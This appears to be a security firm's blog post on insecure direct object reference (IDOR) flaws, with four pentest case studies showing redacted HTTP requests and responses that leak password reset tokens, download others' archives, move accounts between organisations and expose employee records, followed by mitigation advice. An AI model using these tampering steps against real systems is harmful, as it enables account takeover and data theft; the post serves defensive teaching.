---
title: Securing the Insecure Objects
author: Punit
date: 2023-08-23 2:00:00 +0100
categories: [Web Application Pentesting, Case Study, IDOR, BAC]
tags: [application security, IDOR, Broken Access Control, web pentesting]
image:
  path: https://github-production-user-asset-6210df.s3.amazonaws.com/25560539/262679397-34e36773-d8fa-4f97-9866-bb81fd8cd47a.png
  alt: 
render_with_liquid: false
---

### Overview

Greetings, everyone! In this blog, our Application Security Specialist [Punit](https://www.linkedin.com/in/0xanuj/), will be talking about a critical security category. Punit's primary role within our team involves penetration testing and hacking the security of Web applications, Mobile apps, Web Services and APIs. 

Vulnerabilities lurk around every corner, waiting to be discovered and exploited by malicious actors. One such vulnerability that has been a long-standing challenge for developers and security experts alike is the Insecure Direct Object Reference (IDOR) vulnerability. IDOR is a class of security flaws that arises when an application fails to properly protect access to sensitive resources by directly exposing internal object references.

In this blog, we will delve into the technical aspects of IDOR and explore some real-world case studies to understand its impact. Our exploration will encompass the following focal points:

* Understanding IDOR
* The Landscape of IDOR Attack
* Case Study 1:  Leaking Password Reset Token?
* Case Study 2: Downloading Confidential Zip Archive
* Case Study 3: Organisation Takeover, Transferring user to another organisation
* Case Study 4: UUIDs are Secure? Isn't it?
* Mitigation and Recommendations
* Conclusion
* References

## Understanding IDOR

IDOR occurs when threat actors can manipulate an input parameter, usually in the form of an identifier such as an ID, to gain unauthorised access to sensitive resources or perform actions that are not supposed to be performed. The vulnerability arises when the application relies solely on user-supplied input to access data without appropriate validation and authorisation checks.

For instance, consider an online banking application where users can view their bank statements by providing their account number in the URL. If the application does not validate whether the user is authorised to view that specific account's statement, a threat actor could easily change the account number in the URL to view other users' confidential financial information. 

Last month, July 2023, the Australian Signals Directorate’s Australian Cyber Security Centre (ACSC), U.S. Cybersecurity and Infrastructure Security Agency (CISA), and U.S. National Security Agency (NSA) released a joint Cybersecurity Advisory to warn vendors, designers, and developers of web applications and organisations about insecure direct object reference (IDOR) vulnerabilities. Check out the advisory [here](https://media.defense.gov/2023/Jul/27/2003269443/-1/-1/0/JOINT-CSA-PREVENTING-WEB-APPLICATION-ACCESS-CONTROL-ABUSE.PDF}).

## The Landscape of IDOR Attack

To understand how an IDOR attack works, let's break it down step by step:

1. **Identifying the Vulnerability**: A malicious actor must first identify the presence of an IDOR vulnerability within a target application. This typically involves analysing the application's behaviour and endpoints to discern potential weak points.
2. **Manipulating Input Parameters**: Once a potential vulnerability is identified, the threat actor will manipulate input parameters, such as object identifiers, to access restricted data or perform unauthorised actions. This manipulation can involve altering URLs, request parameters, or API endpoints.
3. **Gaining Unauthorised Access**: With successful parameter manipulation, the attacker can access sensitive data or perform actions that they shouldn't have permission to do. For example, they might access another user's private files or modify critical database records.

Now, let's delve into a few real-world case studies that we've encountered during our routine application penetration testing assessments.

![IDORx](https://github.com/CognisysGroup/cognisysgroup.github.io/assets/25560539/c9859b60-7c11-4d67-bd34-b3126ec8db86)


## Case Study 1:  Leaking Password Reset Token?

In this case study, we will explore a scenario where a critical Insecure Direct Object Reference (IDOR) vulnerability allowed us to access sensitive information including password reset tokens using a simple manipulation of usernames. This vulnerability led to unauthorised account takeover, jeopardising user accounts and their associated data.

**Request:**
```http
GET /cases-api/getUserByUsername?username=AdminUser HTTP/1.1
Host: <REDACTED>
Cookie: <REDACTED>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36  
Accept: application/json, text/plain, */*
X-Requested-With: XMLHttpRequest
Referer: https://<REDACTED>/cases/create
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
```

**Response:**
```http
HTTP/2 200 OK  
Date: Wed, 07 Jun 2023 12:51:27 GMT  
Content-Type: text/html; charset=UTF-8  
Cache-Control: no-store, private  
X-Frame-Options: SAMEORIGIN  
X-Content-Type-Options: nosniff  
Strict-Transport-Security: max-age=15724800; includeSubDomains  
  
{  
  "id": 36,  
  "username": "AdminUser",  
  "login_attempts": 0,  
  "company": "CognisysTest",  
  "organisation_id": 12,  
  "licence_id": null,  
  "admin_level": 0,  
  "email": "admin.user@redacted.co.uk",  
  "name": "Admin User",    
  "vmsEnabled": 0,  
  "twofa_enabled": 0,  
  "pwResetToken": null,  
  "pwResetExpiry": null,  
  "capability_two_authorised": 0,   
  "created_at": null,  
  "updated_at": null,  
  "is_trial": 0,  
  "deleted_at": null  
}
```

The `username` parameter was vulnerable to IDOR. After observing the above response, we noticed some interesting keys within the JSON response such as `pwResetToken`, which appeared to be a password reset token. It seemed the application dumped the entire user object within the response.  In the above response, `pwResetToken` was showing `null` which made us wonder what if we request a password reset token using forgot password functionality, since the email address of the user was already disclosed in the response. Would it appear in the above response? Well, let's find out.

After sending the password reset link, we can see the password reset token in the response parameter `pwResetToken`. :

**Response**

```http
HTTP/2 200 OK  
Date: Wed, 07 Jun 2023 12:51:27 GMT  
Content-Type: text/html; charset=UTF-8  
Cache-Control: no-store, private  
X-Frame-Options: SAMEORIGIN  
X-Content-Type-Options: nosniff  
Strict-Transport-Security: max-age=15724800; includeSubDomains  
  
{  
  "id": 36,  
  "username": "AdminUser",  
  "login_attempts": 0,  
  "company": "CognisysTest",  
  "organisation_id": 12,  
  "licence_id": null,  
  "admin_level": 0,  
  "email": "admin.user@redacted.co.uk",  
  "name": "Admin User",    
  "vmsEnabled": 0,  
  "twofa_enabled": 0,  
  "pwResetToken": "35712ff8b8f3d83bca3fec078fcf6ead",  
  "pwResetExpiry": "2023-06-08 13:16:09",   
  "capability_two_authorised": 0,   
  "created_at": null,  
  "updated_at": null,  
  "is_trial": 0,  
  "deleted_at": null  
}
```

Now we have the `pwResetToken` value, which could be used to reset the user's password using the below forgot password endpoint.

```
https://<REDACTED>/users/forgotpw?token=<PASSWORD_RESET_TOKEN>
```

### Impact: 

This vulnerability, rooted in an Insecure Direct Object Reference (IDOR) weakness, had far-reaching consequences. By exploiting this flaw during the test, we were able to gain unauthorised access to "forgot password" reset tokens via a straightforward manipulation of usernames. From here, it was trivial to achieve account takeovers that not only compromised user accounts but also placed sensitive associated data at risk. Such an incident would have grave consequences for the affected users, including potential data breaches, identity theft, and a profound erosion of trust in the compromised system or service
## Case Study 2: Downloading Confidential Zip Archive

Another real-world case of IDOR was discovered within an organisation's management portal where admins can generate zip archives which can be further downloaded by other users using the zip archive's case id. The issue at hand revolves around the fact that these case IDs are simply sequential integers, enabling anyone to access other users' archives by incrementing or decrementing the value of case IDs.

We observed the below GET endpoint to download the zip archive export of cases:  
`/api/export/download/<CASE ID>`

It was possible to change the `<CASE_ID>` to any arbitrary case ID in order to download its export zip archive.

**Request:**

```http
GET /api/exports/zip/download/<CASE_ID> HTTP/2
Host: <REDACTED>
﻿﻿Cookie: <REDACTED>
﻿﻿Referer: <REDACTED>
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; X64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36
Accept-Encoding: gzip, deflate
﻿﻿﻿Accept-Language: en-GB, en-US; q=0.9, en; q=0.8
```

**Response:**

```http
HTTP/2 200 OK
Date: Thu, 08 Jun 2023 12:58:42 GMT
﻿﻿Content-Type: application/zip
﻿﻿Content-Length: 769
Content-Disposition: inline; filename=new-test-case.zip
Cache-Control: no-cache, private
﻿﻿Access-Control-Allow-Origin: *
﻿﻿﻿X-Frame-Options: SAMEORIGIN
﻿﻿﻿X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=15724800; includeSubDomains

PK
eEVdefault/PKPK
\..SNIP..\
```

### Impact:

The IDOR vulnerability allowed users to download zip archives using sequential case IDs. By altering the case ID in the download request, attackers could access other users' confidential data. This breach exposed sensitive information, risking legal consequences, reputational damage, and financial losses for both the organisation and affected individuals. This incident underscores the necessity of robust access controls and input validation to prevent unauthorised data access and maintain user trust.

## Case Study 3: Organisation Takeover, Transferring user to another organisation

One of the biggest Fintech Corp we worked for deployed a widely-used collaboration platform that allows users to manage and share documents, projects, and resources across different organisations. Users are assigned to organisations, each having specific roles and permissions. Alice and Bob are two users on the platform, belonging to different organisations. Alice is a team lead at "OrgA," while Bob is an administrator at "OrgB."

The platform had an inherent flaw in its access control mechanism. Users' access to resources was determined based on the unique identification numbers associated with their organisations, which were sequentially generated. Unfortunately, this design flaw allowed threat actors to exploit IDOR vulnerabilities, where a simple manipulation of the unique IDs could grant unauthorised access to resources.

We identified a _**clientId**_ parameter within a POST request initiated to `/api/user/userUpdateManagement` endpoint. The parameter exposes an insecure direct object reference. This flaw allows a user to manipulate the _**clientId**_ and substitute it with the _**clientId**_ of a different organisation. Exploiting this, a threat actor could move their account to any other organisation, thus gaining access to a completely different organisation.

**Request:**

```http
POST /api/user/userUpdateManagement HTTP/2
Host: <REDACTED>
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Authorization: Bearer <LOWEST PRIVILEGED USER's TOKEN>
Content-Length: 1652
Origin: https://redacted.co.uk
Referer: https://redacted.co.uk

{
  "errors": [],
  "warnings": [],
  "Password": "REDACTED",
  "deleted": false,
  "name": "Punit",
  "emailAddress": "punit@redacted.co.uk",
  "username": "PenTest9",
  "firstName": "Punit",
  "middleName": null,
  "lastName": null,  
  "clientId": 5646,
  "setInactive": false,
  "id": 63891,
  "created": "2022-03-28T14:21:24.257",
  "modified": "2023-05-12T14:49:00.003",
  "latestInviteTimeStamp": "2023-05-05T15:43:15.367",
  "accessAreas": 1,
  "createdUser": {
    "name": "Sys Admin",
    "id": 63887
  },  
  "modifiedUser": {
    "name": "Sys Admin",
    "id": 63887
  }

_..[SNIP].._
}
```

**Response:**

```http
HTTP/2 200 OK  
Date: Mon, 15 May 2023 12:33:03 GMT  
Content-Type: application/json; charset=utf-8  
Content-Length: 543  
Server: cloudflare

{  
  "deleted": false,  
  "name": "Punit",  
  "emailAddress": "punit@redacted.co.uk",  
  "username": "PenTest9",  
  "firstName": "Punit",  
  "middleName": null,  
  "lastName": null,
  "clientId": 5646,  
  "setInactive": false,  
  "id": 63891,  
  "created": "2022-03-28T14:21:24.257",  
  "modified": "2023-05-15T12:33:03.5083154Z",  
  "accessAreas": 1,  
  "createdUser": null,  
  "modifiedUser": null  
}
```
As seen above the ***clientId*** was changed to 5646 from 5645. The response to the above request clearly shows the _**clientId**_ is updated to 5646. We have tried to login to the same account again and we identified that the account was moved to the new respective organisation and it was possible to access all the resources of that organisation.
### Impact:

The vulnerability in a prominent fintech collaboration platform had significant implications. By manipulating client ID parameters in one of the platform's APIs, attackers could transfer users between organisations. This breach not only compromised data security but also disrupted the organisational structure, granting unauthorised access to sensitive documents and projects. The potential for financial losses, regulatory violations, and reputational damage underscored the urgency of stringent API security and access controls in fintech environments.
## Case Study 4: UUIDs are Secure? Isn't it?

![image](https://github.com/CognisysGroup/cognisysgroup.github.io/assets/25560539/89553496-2787-47cb-835d-99bc58ac740b)


We were conducting tests on a client management system designed for employee management and HR functions. During our evaluation of the system's profile section, we discovered a potential vulnerability related to the use of UUIDs. We can get sensitive PII data of any organisation's employees including their contracts and passports using organisations' UUIDs which increases the severity of the issue.

To validate this issue, we created two organisations, OrgA and OrgB, both of which were under our control. The primary challenge lies in enumerating UUIDs from other organisations in order to exploit this vulnerability.

**Request:**

```http
GET /api/v1/profile/data/c/39f83650-14af-422b-8771-555213ec27ef HTTP/1.1
Host: redacted.co.uk
Cookie: <Redacted>
```

**Response:**

```http
HTTP/1.1 200 OK
Server: nginx
Date: Tue, 13 June 2023 11:32:08 GMT  
Set-Cookie: <Redacted>
Content-Type: application/json

{
  "status": "success",
  "uuid": "39f83650-14af-422b-8771-555213ec27ef",
  "orgName": "REDACTED",
  "data": [
  {
    "id": "b50120e5-fa3d-4d87-ada9-468706f52c27",
    "first_name": "John",
    "last_name": "Doe",
    "email": "john.doe@REDACTED.com",
    "age": 32,
    "address": "123 Main Street",
    "city": "Anytown",
    "state": "CA",
    "zip_code": "12345",
    "employee_status": "REDACTED"
    "passport_URL": "REDACTED",
    "Contract_URL" "REDACTED"
  },
  {
    "id": "7be32264-c087-46a5-8b6d-f5686b7e67cb",
    "first_name": "Jane",
    "last_name": "Smith",
    "email": "jane.smith@REDACTED.com",
    "age": 28,
    "address": "456 Elm Street",
    "city": "Somewhere",
    "state": "NY",
    "zip_code": "54321",
    "employee_status": "REDACTED"
    "passport_URL": "REDACTED",
    "Contract_URL": "REDACTED"
  },
  \\SNIP\\
]
}
```

We verified the presence of an IDOR vulnerability, but obtaining the UUIDs of other target organisations was challenging. However, during the signup process, we came across an API request that allowed us to enumerate an organisation's UUID by performing username enumeration on the organisation's owner.

**Request:**
```http
POST /api/organistaion/?e=punit@redacted.com HTTP/2
Host: <REDACTED>
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/json
Origin: https://redacted.co.uk
Referer: https://redacted.co.uk

```

**Response:**

```http
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 15 May 2023 12:36:03 GMT  
Set-Cookie: <Redacted>
Content-Type: application/json

{
  "status": "success",
  "data": [
    "uuid": "5a8fd90a-4e26-4043-b662-4bddda0e9539",
    "username": "Punit.Pentester",
    "email": "punit@redacted.com"
    "isExists": true,
  ]
}
```

In simple terms, to access sensitive information tied to a target organisation, we just need the owner's username or email. The uniqueness and complexity of the UUIDs used as identifiers no longer serve as a sufficient security barrier if there's a possibility of exposing this sensitive information through other means or vulnerabilities.
## Mitigation and Recommendations

Understanding the technical aspects of IDOR is crucial for both developers and security professionals to mitigate and prevent such vulnerabilities. Here are some key points to keep in mind:

1. **User Input Validation**: Always validate user inputs, especially when they are used to access sensitive resources or perform critical actions. Input validation should include checks for authorisation and access rights.

2. **Use Indirect References**: Instead of directly exposing internal object references (e.g., database IDs) in URLs or API parameters, use indirect references or unique tokens that cannot be easily guessed or manipulated.

3. **Role-Based Access Control (RBAC)**: Implement a robust RBAC system to ensure that users have appropriate permissions to access certain resources or perform specific actions. Enforce authorisation checks at various stages of the application flow.

4. **Access Control Testing**: Regularly conduct access control and security assessments to identify and fix potential IDOR vulnerabilities.
   
## Conclusion

IDOR vulnerabilities are a persistent threat to the security of web applications, allowing attackers to gain unauthorised access to sensitive resources or perform actions they shouldn't. By understanding the technical aspects of IDOR and learning from real-world case studies, developers and security professionals can fortify their applications against such risks and ensure the protection of user data and privacy. Regular security testing and a proactive security mindset are essential to stay ahead in the ongoing battle against cyber threats.

Remember, securing your application is not a one-time effort; it's an ongoing commitment to safeguarding user information and maintaining trust in your digital services. Stay vigilant, stay secure!

## References

- [https://portswigger.net/web-security/access-control/idor](https://portswigger.net/web-security/access-control/idor)
- [https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [https://www.cisa.gov/sites/default/files/2023-07/aa23-208a_joint_csa_preventing_web_application_access_control_abuse.pdf](https://www.cisa.gov/sites/default/files/2023-07/aa23-208a_joint_csa_preventing_web_application_access_control_abuse.pdf)
- [https://owasp.org/Top10/A01_2021-Broken_Access_Control/](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
